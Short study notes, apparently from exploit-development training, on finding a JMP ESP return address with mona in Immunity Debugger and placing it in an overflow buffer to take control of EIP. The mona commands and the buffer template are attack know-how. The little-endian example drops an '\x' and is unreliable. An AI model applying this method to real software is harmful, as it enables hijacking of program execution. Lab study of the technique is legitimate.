1. Find module without protections (False):
    - `!mona modules`
    - Take note of the module name (e.g. essfunc.dll)
2. Find **JMP ESP**
    - `!mona jmp -r esp -cpb "<badchars"`
    - OR
    - `!mona find -s "\xff\xe4" -m <module>`
3. Take not of **ALL** the return addresses for all JMP ESP pointers
4. `buffer=b"A" * <offset> + b"<JMP ESP return address>"`
    - 0x625011AF => \xaf\x11\x50\62 # Little Endian
5. In Immunity Debugger: set breakpoint on the JMP ESP return address (Go to address is disassembler: <JMP ESP> and press F2)
6. Crash the app again
7. EIP should now have the JMP ESP return address
8. If not, try again with other JMP ESP return addresses

